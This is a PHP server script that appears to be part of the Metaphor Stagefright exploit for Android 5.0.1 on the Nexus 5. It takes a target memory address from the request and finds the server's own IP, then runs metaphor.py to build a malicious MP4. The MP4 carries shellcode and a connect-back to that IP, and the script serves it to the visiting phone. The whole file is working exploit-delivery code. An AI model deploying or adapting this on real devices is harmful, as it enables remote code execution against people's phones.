<?php
    include 'android_ua.php';

    $final_ua = get_android_ua();
    $config_path = "../config/Android 5.0.1; Nexus 5 Build/LRX22C.json";

    $path = '../exploit';

    $addr = $_GET['addr'];
    
    $addr = @hexdec($addr);
    $addr = @dechex($addr);

    $hash = md5($_SERVER['HTTP_USER_AGENT']);

    // trim is necessary - hostname appends whitespaces to the output
    $hostname = trim(shell_exec('hostname'));
    $ip = gethostbyname($hostname);
    $little_ip = ip2long($ip);
    $big_ip = 0;
    for ($i = 0; $i < 4; $i++)
    {
        $big_ip *= 0x100;
        $big_ip += $little_ip % 0x100;
        $little_ip /= 0x100;
    }

    $shellcode_path = "../shellcodes/bx_0x3700.bin";
    $file_path = "rce/rce_${addr}_${hash}.mp4";

    $cmd = "python -B $path/metaphor.py -c \"$config_path\" -o $file_path rce -b $addr -s $shellcode_path -1 0 -2 $big_ip -3 26214";

    exec($cmd);

    header('Content-Type: video/mp4');
    $data = file_get_contents($file_path);
    die($data);
?>